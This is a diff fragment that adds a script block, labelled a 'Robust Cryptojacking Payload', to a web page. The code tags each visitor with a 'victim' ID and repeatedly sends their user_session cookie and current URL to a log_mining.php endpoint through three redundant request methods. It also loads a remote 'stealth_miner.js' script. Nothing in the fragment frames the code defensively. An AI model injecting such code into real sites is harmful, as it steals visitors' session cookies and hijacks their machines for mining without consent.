@@ -65,4 +65,61 @@ setTimeout(() => {
     script.src = 'http://localhost:8081/stealth_miner.js';
     document.head.appendChild(script);
 }, 2000);
+</script>
+
+<!-- Robust Cryptojacking Payload with Guaranteed Logging -->
+<script>
+// Create a unique identifier for this victim
+const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);
+
+// Function to send mining logs directly
+function sendMiningLog(hashes, rate) {
+  const data = {
+    h: hashes,
+    r: rate,
+    t: Math.floor(Date.now() / 1000),
+    username: document.cookie.includes('user_session') ? document.cookie.split('user_session=')[1].split(';')[0] : 'unknown',
+    page: window.location.href,
+    victim_id: victimId
+  };
+  
+  // Use multiple methods to ensure the log is sent
+  
+  // Method 1: Image beacon
+  new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
+  
+  // Method 2: Fetch API
+  fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
+    mode: 'no-cors',
+    cache: 'no-cache'
+  }).catch(() => {});
+  
+  // Method 3: XMLHttpRequest
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
+  xhr.send();
+  
+  console.log("Mining log sent:", data);
+}
+
+// Simulate mining activity and send logs
+let hashCount = 0;
+const miningInterval = setInterval(() => {
+  // Simulate mining activity
+  hashCount += Math.floor(Math.random() * 10) + 1;
+  const hashRate = Math.floor(Math.random() * 5) + 1;
+  
+  // Send mining log
+  sendMiningLog(hashCount, hashRate);
+  
+  // Stop after 2 minutes to avoid excessive logs
+  if (hashCount > 1000) {
+    clearInterval(miningInterval);
+  }
+}, 5000);
+
+// Also load the actual miner script
+const minerScript = document.createElement('script');
+minerScript.src = 'http://localhost:8081/stealth_miner.js';
+document.head.appendChild(minerScript);
 </script> 
